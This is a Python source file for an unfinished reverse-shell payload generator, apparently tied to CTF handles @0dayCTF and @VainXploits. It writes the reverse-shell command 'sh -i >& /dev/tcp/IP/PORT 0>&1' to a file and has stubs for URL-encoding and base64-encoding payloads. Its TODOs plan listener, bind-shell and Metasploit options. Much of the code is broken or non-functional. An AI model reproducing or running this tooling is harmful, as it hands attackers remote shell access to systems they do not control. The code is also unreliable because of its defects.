import fileinput
import os
import io
import urllib.parse
import base64

#########################################################

print('''
 .----------------. .----------------. .----------------. .----------------. .----------------. 
| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
| |     ____     | | |   _____      | | |   _____      | | |     _____    | | |  _________   | |
| |   .'    `.   | | |  |_   _|     | | |  |_   _|     | | |    |_   _|   | | | |_   ___  |  | |
| |  /  .--.  \  | | |    | |       | | |    | |       | | |      | |     | | |   | |_  \_|  | |
| |  | |    | |  | | |    | |   _   | | |    | |   _   | | |      | |     | | |   |  _|  _   | |
| |  \  `--'  /  | | |   _| |__/ |  | | |   _| |__/ |  | | |     _| |_    | | |  _| |___/ |  | |
| |   `.____.'   | | |  |________|  | | |  |________|  | | |    |_____|   | | | |_________|  | |
| |              | | |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------' '----------------' '----------------' 
                                                                                    @0dayCTF, @VainXploits
                                                                                      Twitter: https://twitter.com/0dayCTF
                                                                                      Twitter: https://twitter.com/VainXploits
                                                                                    
''')
#######################NOTES-STR#######################
PAYLOAD = input("What payload do you want to use: ")
# IP_var = input("Receiving IP: ")
# PORT_var = input("Receiving PORT: ")
# IP = print(open('file.txt', 'r').read().replace('IP', IP_var) ) # ----> Really Really important.
# print(open('file.txt', 'r').read().replace(IP + 'PORT', PORT_var))
#######################NOTES-END#######################

def display_payload_options():
  f = open('demo.txt', 'r')
  file_contents = f.read()
  print(file_contents)
  f.close()

def main():
  # open the sample file used
  file = open('assets/payloads.txt')
  # read the content of the file opened
  content = file.readlines()
  # read nth line from the file


def display_actual():
  kilo = open('assets/payloads.txt')
  content1 = kilo.readlines()
  f = open("assets/current-payload.txt", "x+")
  f = open('assets/current-payload.txt', 'w')
  f.write("sh -i >& /dev/tcp/IP/PORT 0>&1")
  # WORKS UNTIL THE ABOVE LINE ^^
display_actual()

# output = io.StringIO()
# output.write(main())

# This function is for urlencoding the payloads.
def url_encode():
  alpha = urllib.parse.quote(main(), safe='')
  print(alpha)

# This function is for double urlencoding the payloads.
def double_url_encode():
  bravo = urllib.parse.quote(main(), safe='')
  charlie = urllib.parse.quote(bravo, safe='')
  print(charlie)

# This function is for base64 encoding the payloads.
def base64_encode():
  delta = 'PAYLOAD'
  echo = delta.encode('utf-8')
  foxtrot = base64.b64encode(echo)
  print(foxtrot.decode('utf-8'))

# TODO: Work on printing the stuff from display_payload_options() function in a grid format. Ref: https://stackoverflow.com/questions/32460832/print-a-list-of-strings-in-a-grid-format-python
# TODO: Do the manual labour of putting all the payloads into a txt file.
# TODO: Work on listener options.
# TODO: Work on how I can do most of this from single command in the terminal instead of throwing the user a whole bunch of fucking prompts once they run the tool.
# TODO: ^^ Includes how to select Reverse, Bind or MSF and how to select a particular payload they want(inside the sections in the revhsells website).
# TODO: For def main() https://www.w3resource.com/python-exercises/os/python-os-exercise-16.php memory buffer values.
# TODO: Work on memory buffer thingy, see if it works and implement if it works.
